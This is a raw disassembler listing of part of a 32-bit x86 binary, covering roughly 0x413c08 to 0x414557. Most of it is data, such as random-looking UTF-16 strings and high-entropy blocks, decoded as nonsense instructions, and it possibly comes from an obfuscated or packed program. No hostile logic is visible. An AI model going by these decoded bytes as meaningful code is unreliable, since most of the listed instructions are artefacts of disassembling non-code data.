  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	cmp    BYTE PTR [edi+esi*4+0x16],bl
  413f04:	(bad)  
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    eax,0xc9000001
  413f0d:	mov    al,ds:0xf56369ca
  413f12:	pusha  
  413f13:	(bad)  
  413f14:	loope  0x413f78
  413f16:	leave  
  413f17:	push   esi
  413f18:	data16 js 0x413f06
  413f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f1c:	jo     0x413f15
  413f1e:	cwde   
  413f1f:	iret   
  413f20:	jecxz  0x413f77
  413f22:	out    dx,al
  413f23:	add    bl,BYTE PTR [ebx+0x2d]
  413f26:	aad    0x2d
  413f28:	stos   DWORD PTR es:[edi],eax
  413f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f2a:	gs xchg esp,eax
  413f2c:	mov    ds:0x1e513279,al
  413f31:	push   es
  413f32:	xlat   BYTE PTR ds:[ebx]
  413f33:	aad    0x6e
  413f35:	inc    edx
  413f36:	mov    al,0xb3
  413f38:	jecxz  0x413eed
  413f3a:	push   esp
  413f3c:	sti    
  413f3d:	(bad)  
  413f3e:	imul   edi,DWORD PTR [eax-0x77],0x4a13bb95
  413f45:	push   esi
  413f46:	sub    DWORD PTR [eax-0x46],ebp
  413f49:	mov    eax,0xb05fd5bf
  413f4e:	lock fnstsw WORD PTR [ebx]
  413f51:	adc    ecx,DWORD PTR [edx-0x4d]
  413f54:	push   es
  413f55:	mov    bh,0xed
  413f57:	or     eax,0x557d21c4
  413f5c:	adc    ch,dl
  413f5e:	jnp    0x413fd7
  413f60:	mov    ds:0xee1321c6,al
  413f65:	in     eax,dx
  413f66:	or     dl,cl
  413f68:	pusha  
  413f69:	std    
  413f6a:	jmp    0xb6de2095
  413f6f:	call   0x5b8f:0x4eed46d
  413f76:	sub    BYTE PTR [edx+0x3b],cl
  413f79:	cmp    edx,DWORD PTR [ecx+esi*1+0x210e581a]
  413f80:	fnstsw WORD PTR [ebp+0x6b]
  413f83:	lods   eax,DWORD PTR ds:[esi]
  413f84:	std    
  413f85:	repnz pusha 
  413f87:	pop    ss
  413f88:	es mov dh,0xbd
  413f8b:	test   DWORD PTR [edi+0x57febee6],ecx
  413f91:	cld    
  413f92:	cmp    DWORD PTR [ebp+0x7c83a734],eax
  413f98:	int    0xaf
  413f9a:	cmp    esi,DWORD PTR [ebx]
  413f9c:	fisttp DWORD PTR [eax+0x60]
  413fa0:	or     DWORD PTR [ebp+ecx*4+0x68f2fae5],ebp
  413fa7:	mov    ebp,esp
  413fa9:	jae    0x413f69
  413fab:	pushf  
  413fac:	add    eax,0x19e0cb05
  413fb1:	push   esp
  413fb2:	pop    eax
  413fb3:	loopne 0x413f4e
  413fb5:	sbb    BYTE PTR [esi+0x3e4254d6],dh
  413fbb:	pop    ebp
  413fbc:	ins    DWORD PTR es:[edi],dx
  413fbd:	bound  esi,QWORD PTR [eax+0x4c3d55c1]
  413fc3:	jne    0x413f72
  413fc5:	jg     0x41402c
  413fc7:	add    esi,DWORD PTR [esi+0x19]
  413fca:	inc    esi
  413fcb:	fdivp  st(5),st
  413fcd:	xor    edx,DWORD PTR [esp+ebp*4]
  413fd0:	out    dx,eax
  413fd1:	repnz rdtsc 
  413fd4:	adc    ebx,DWORD PTR [ecx-0x5b616f18]
  413fda:	fmul   QWORD PTR [edi-0x3c]
  413fdd:	rol    BYTE PTR gs:[ecx],1
  413fe0:	adc    eax,0x18309337
  413fe5:	lea    esi,fs:[eax+0x16ac409e]
  413fec:	jne    0x413f77
  413fee:	out    dx,eax
  413fef:	pop    es
  413ff0:	ret    
  413ff1:	xchg   bl,bl
  413ff3:	add    DWORD PTR [ebp+0x7ad3dae1],0xfffffffb
  413ffa:	rcl    BYTE PTR [eax],0xff
  413ffd:	jbe    0x41403c
  413fff:	xlat   BYTE PTR ds:[ebx]
  414000:	fisub  DWORD PTR [ebx]
  414002:	push   ds
  414003:	push   ss
  414004:	add    eax,0xdd0a4d0d
  414009:	int    0xd9
  41400b:	mov    dh,BYTE PTR [ebx]
  41400d:	je     0x414004
  41400f:	fild   DWORD PTR ds:[eax]
	...
  414072:	add    BYTE PTR [eax],al
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x111e:0x40d52e96
  414083:	pop    ebp
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0xec000001
  41408d:	push   cs
  41408e:	fsub   st(5),st
  414090:	push   esp
  414091:	in     al,0x61
  414093:	mov    ?,WORD PTR [esi+0x47]
  414096:	mov    ds:0xf574f,al
  41409b:	sbb    al,0xec
  41409d:	pop    eax
  41409e:	je     0x41411c
  4140a0:	pop    esi
  4140a1:	xor    BYTE PTR [esi],bh
  4140a3:	clc    
  4140a4:	stos   DWORD PTR es:[edi],eax
  4140a5:	push   ds
  4140a6:	aaa    
  4140a7:	in     al,0xfe
  4140a9:	lock (bad) 
  4140ab:	mov    esp,0x5e632d3f
  4140b0:	cmp    DWORD PTR [ecx-0x7af1ec06],eax
  4140b6:	mov    cl,0x92
  4140b8:	mov    bh,dh
  4140ba:	loopne 0x4140be
  4140bc:	dec    ebp
  4140bd:	jnp    0x414119
  4140bf:	xchg   edi,eax
  4140c0:	mov    bh,0xbd
  4140c2:	test   eax,0x2433e817
  4140c7:	push   es
  4140c8:	clc    
  4140c9:	jno    0x414052
  4140cb:	cmc    
  4140cc:	jae    0x414095
  4140ce:	stos   BYTE PTR es:[edi],al
  4140cf:	popf   
  4140d0:	imul   edx,DWORD PTR [edi],0x52
  4140d3:	inc    edi
  4140d4:	sbb    ch,ah
  4140d6:	mov    ds:0x51c6437e,eax
  4140db:	cmc    
  4140dc:	into   
  4140dd:	icebp  
  4140de:	in     eax,dx
  4140df:	in     eax,0x13
  4140e1:	xor    al,0x1c
  4140e3:	out    dx,eax
  4140e4:	push   0xffffff8f
  4140e6:	dec    edi
  4140e7:	inc    esp
  4140e8:	adc    DWORD PTR [eax],eax
  4140ea:	pop    ds
  4140eb:	mov    ds:0x2258407f,al
  4140f0:	push   edx
  4140f1:	or     eax,0xa5280be9
  4140f6:	lods   eax,DWORD PTR ds:[esi]
  4140f7:	sahf   
  4140f8:	add    ecx,DWORD PTR [ecx]
  4140fa:	jns    0x414127
  4140fc:	and    cl,BYTE PTR [esi+0x37b19075]
  414102:	test   BYTE PTR [edi+0x5b],cl
  414105:	xlat   BYTE PTR ds:[ebx]
  414106:	inc    edx
  414107:	xlat   BYTE PTR ds:[ebx]
  414108:	ja     0x4140a7
  41410a:	adc    al,0xa6
  41410c:	fnstcw WORD PTR [ecx]
  41410e:	into   
  41410f:	add    al,0xb7
  414111:	jmp    0x7b503118
  414116:	add    DWORD PTR [ebx-0x2d],0x68
  41411a:	fcomp  DWORD PTR [edi-0xd84090c]
  414120:	jecxz  0x41411f
  414122:	repz dec esp
  414124:	ins    DWORD PTR es:[edi],dx
  414125:	push   ebp
  414126:	popf   
  414127:	adc    cl,0xf4
  41412a:	pushf  
  41412b:	scas   eax,DWORD PTR es:[edi]
  41412c:	pop    edx
  41412e:	into   
  41412f:	jnp    0x41418e
  414131:	aas    
  414132:	nop
  414133:	(bad)  
  414134:	mov    ebx,0x167e3502
  414139:	inc    eax
  41413a:	rol    DWORD PTR [ecx-0x6c],1
  41413d:	test   al,0xf0
  41413f:	add    dl,BYTE PTR [ebx]
  414141:	inc    ecx
  414142:	mov    ebp,0xbee08567
  414147:	hlt    
  414148:	lahf   
  414149:	inc    edi
  41414a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41414b:	(bad)  
  41414d:	mov    ch,0x9
  41414f:	and    al,0xc9
  414151:	arpl   WORD PTR [edx-0x17],ax
  414154:	pop    ds
  414155:	stos   DWORD PTR es:[edi],eax
  414156:	sub    eax,0xe44b6a76
  41415b:	call   0x5a210ba8
  414160:	sub    edx,DWORD PTR [eax]
  414162:	sub    ah,bl
  414164:	or     al,BYTE PTR [edx+0xe83095e]
  41416a:	and    al,0x17
  41416c:	mov    edi,0xac123d73
  414171:	push   0x19
  414173:	jl     0x41412c
  414175:	cmp    eax,0xa3d5d774
  41417a:	adc    DWORD PTR [esi+eiz*2-0x1d0cdd84],edi
  414181:	cmp    eax,0x9817e95f
  414186:	pop    esp
  414187:	ror    BYTE PTR ds:[ebp-0x19],1
  41418b:	(bad)  
  41418c:	test   bh,0xcc
  41418f:	cli    
  414190:	dec    edx
	...
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	aad    0xa8
  414202:	fmul   QWORD PTR [edx+0xd3e6]
  414208:	add    eax,0x9a000001
  41420d:	imul   esi,DWORD PTR [edx-0x6e],0x815fc6bf
  414214:	xor    eax,0xb0ee5113
  414219:	bound  edx,QWORD PTR [ebp-0x796d813f]
  41421f:	and    ah,BYTE PTR [esi-0x78]
  414222:	push   ss
  414223:	and    eax,0xa7c41d9d
  414228:	fwait
  414229:	into   
  41422a:	mov    cl,0xd4
  41422c:	sbb    BYTE PTR [edx+0x25adbd7c],ah
  414232:	cs inc ecx
  414234:	cmp    bh,ah
  414236:	outs   dx,BYTE PTR ds:[esi]
  414237:	mov    edi,0x804bdc3f
  41423c:	xor    al,0xb5
  41423e:	pop    ebp
  41423f:	jmp    0x414296
  414241:	cmp    eax,0x88ab1348
  414246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414247:	mov    al,ds:0x9def9316
  41424c:	inc    esi
  41424d:	xor    al,0xd5
  41424f:	xchg   DWORD PTR [esi],ebx
  414251:	ret    0x3b2c
  414254:	ret    
  414255:	leave  
  414256:	xor    BYTE PTR [ecx-0x18],0x7d
  41425a:	cld    
  41425b:	imul   ebx,DWORD PTR [ebx+edx*1-0x53],0x73d3eacd
  414263:	sar    BYTE PTR [ebx+ebx*8],1
  414266:	cld    
  414267:	ss jl  0x414271
  41426a:	mov    ah,0x77
  41426c:	aam    0x32
  41426e:	jns    0x414234
  414270:	aas    
  414271:	xchg   ah,bl
  414273:	mov    WORD PTR [ecx+esi*2],gs
  414276:	fstp   QWORD PTR [ebx+0x3472d936]
  41427c:	jb     0x41426a
  41427e:	lock cmp al,0xcc
  414281:	xchg   BYTE PTR [esi-0x2a5457d9],dl
  414287:	sahf   
  414288:	das    
  414289:	xlat   BYTE PTR ds:[ebx]
  41428a:	fs dec ebx
  41428c:	push   0xbc2743fb
  414291:	dec    esi
  414292:	arpl   WORD PTR [ecx+0x11],si
  414295:	into   
  414296:	pop    eax
  414297:	push   esp
  414298:	in     al,dx
  414299:	fnstsw WORD PTR ds:0x1d1f10fa
  41429f:	jmp    0xb3b7:0x69441d39
  4142a6:	ds inc edx
  4142a8:	stos   BYTE PTR es:[edi],al
  4142a9:	mov    al,ds:0xe024f38d
  4142ae:	jmp    0x8dbb:0x543fb9fc
  4142b5:	loope  0x4142c8
  4142b7:	adc    eax,0xae33b895
  4142bc:	push   es
  4142bd:	pop    edx
  4142be:	mov    ebp,0xa6f339aa
  4142c3:	lds    esp,FWORD PTR [edi+0x5e]
  4142c6:	test   eax,0x839d4fc9
  4142cb:	mov    ds:0xef346498,eax
  4142d0:	add    BYTE PTR [ecx+0x6],cl
  4142d3:	pop    ss
  4142d4:	mov    edi,0x9a0db4e6
  4142d9:	lea    ebx,[ebx-0x34]
  4142dc:	clc    
  4142dd:	adc    al,0x17
  4142df:	mov    bl,0xcd
  4142e1:	push   0x9f9db86e
  4142e6:	call   0x6e5b6834
  4142eb:	or     eax,0x266a2770
  4142f0:	jg     0x414325
  4142f2:	or     BYTE PTR [edx-0x7f],al
  4142f5:	scas   eax,DWORD PTR es:[edi]
  4142f6:	lock mov ds,ebx
  4142f9:	add    eax,0xd092bd58
  4142fe:	imul   esp,edi,0x4f11af76
  414304:	adc    DWORD PTR [eax-0x3],eax
  414307:	cdq    
  414308:	stos   DWORD PTR es:[edi],eax
  414309:	inc    eax
  41430a:	bnd jg 0x4142ec
  41430d:	jecxz  0x414368
  41430f:	xor    esi,DWORD PTR [ecx+0x0]
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	mov    ebp,0xeb013413
  414385:	aam    0x0
  414387:	add    BYTE PTR ds:0xa9000001,al
  41438d:	faddp  st(2),st
  41438f:	or     DWORD PTR [esi-0x5be06f30],ebp
  414395:	pop    esp
  414396:	mov    edx,ebx
  414398:	push   eax
  414399:	mov    ch,0x1c
  41439b:	mov    eax,0xbec0573a
  4143a0:	fiadd  WORD PTR [edx-0x3a8237e1]
  4143a6:	dec    ecx
  4143a7:	jg     0x4143e4
  4143a9:	mov    eax,ds:0x932a9a89
  4143ae:	mul    BYTE PTR [edx-0x3b]
  4143b1:	les    esp,FWORD PTR [eax-0x11c21f8f]
  4143b7:	imul   edx,DWORD PTR [edi+0x5f],0xd52ce223
  4143be:	mov    edi,eax
  4143c0:	(bad)  
  4143c1:	stos   DWORD PTR es:[edi],eax
  4143c2:	or     DWORD PTR [ecx],0xffffffde
  4143c5:	inc    eax
  4143c6:	not    DWORD PTR [ebp-0x78]
  4143c9:	addr16 ja 0x4143cd
  4143cc:	jg     0x4143f5
  4143ce:	and    eax,0xd099f270
  4143d3:	mov    cl,0x13
  4143d5:	addr16 (bad) 
  4143d7:	jb     0x414376
  4143d9:	aaa    
  4143da:	mov    ebp,0x2bc9a15a
  4143df:	inc    edi
  4143e0:	cmp    DWORD PTR [esp+ebx*4+0x39985764],esi
  4143e7:	psubusb mm3,QWORD PTR [ebp+0x1bc34d56]
  4143ee:	mov    al,ds:0xced9b1b3
  4143f3:	dec    ebx
  4143f4:	(bad)  
  4143f5:	test   eax,0x74b77f0d
  4143fa:	adc    eax,0x3fe368bc
  4143ff:	xor    eax,0x2cc29b70
  414404:	jmp    0x41445a
  414406:	push   es
  414407:	xchg   esi,eax
  414408:	inc    edi
  414409:	pop    edi
  41440a:	ss cwde 
  41440c:	xor    eax,DWORD PTR [edi]
  41440e:	fdiv   QWORD PTR [edx-0x76cdc5d3]
  414414:	push   es
  414415:	sbb    esp,DWORD PTR [ebp+0x4]
  414418:	mov    WORD PTR [edx+0x743083e3],fs
  41441e:	and    bl,BYTE PTR [eax]
  414420:	xor    eax,0x14757be
  414425:	push   esp
  414426:	or     BYTE PTR [eax+0x29b56d68],dh
  41442c:	(bad)  [ebp+0x26febe5c]
  414432:	sub    eax,0xe22b1dea
  414437:	dec    esi
  414438:	pop    ss
  414439:	outs   dx,DWORD PTR ds:[esi]
  41443a:	dec    eax
  41443b:	ror    DWORD PTR [esi+0x591d3ca5],cl
  414441:	fimul  DWORD PTR [edx]
  414443:	mov    es,ecx
  414445:	cmp    al,0xd1
  414447:	loop   0x414471
  414449:	sbb    DWORD PTR [esi-0x7233a9c2],esp
  41444f:	imul   BYTE PTR [ebx-0x124de91d]
  414455:	inc    ebp
  414456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414457:	sar    bl,0xab
  41445a:	inc    BYTE PTR ds:0x69ec021c
  414460:	and    BYTE PTR [eax],bl
  414462:	add    eax,0x1e4a853a
  414467:	jge    0x414425
  414469:	push   ebx
  41446a:	and    eax,0x9fe28285
  41446f:	loopne 0x41446b
  414471:	cmp    eax,DWORD PTR [ebx+0x31]
  414474:	fsubr  st,st(1)
  414476:	mov    ecx,0xb1c739a6
  41447b:	popf   
  41447c:	hlt    
  41447d:	mov    eax,0x4303caf7
  414482:	scas   al,BYTE PTR es:[edi]
  414483:	test   eax,0xf1c0b579
  414488:	fld    QWORD PTR [ecx-0x27]
  41448b:	cmp    ebx,ebx
  41448d:	adc    DWORD PTR [ecx],edx
  41448f:	push   ds
  414490:	jbe    0x414492
	...
  4144f2:	add    BYTE PTR [eax],al
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x53]
  414501:	adc    al,0x87
  414503:	stc    
  414504:	lock aad 0x0
  414507:	add    BYTE PTR ds:0xd5000001,al
  41450d:	adc    esi,DWORD PTR [edx-0x7b9f748b]
  414513:	cmp    ch,dh
  414515:	mov    ch,0x1f
  414517:	inc    ebx
  414518:	jno    0x4144ab
  41451a:	pusha  
  41451b:	ins    DWORD PTR es:[edi],dx
  41451c:	pusha  
  41451d:	hlt    
  41451e:	mov    dl,0xf3
  414520:	int    0xc9
  414522:	and    ebp,DWORD PTR [ecx-0x13]
  414525:	mov    ebp,0xaef35aaa
  41452a:	inc    edi
  41452b:	shr    BYTE PTR [ecx],cl
  41452d:	sar    BYTE PTR ds:0x61b88c48,cl
  414533:	fistp  DWORD PTR [ebx]
  414535:	repz sbb ch,ah
  414538:	das    
  414539:	jecxz  0x4145a7
  41453b:	sub    al,0xa8
  41453d:	ror    ah,1
  41453f:	inc    ebp
  414540:	fwait
  414541:	imul   ebp,DWORD PTR [ecx],0x32
  414544:	and    bl,BYTE PTR [edx-0x139f5836]
  41454a:	iret   
  41454b:	xlat   BYTE PTR ds:[ebx]
  41454c:	popf   
  41454d:	bnd js 0x4145b9
  414550:	jmp    0xb99a:0x3cbe614b
  414557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
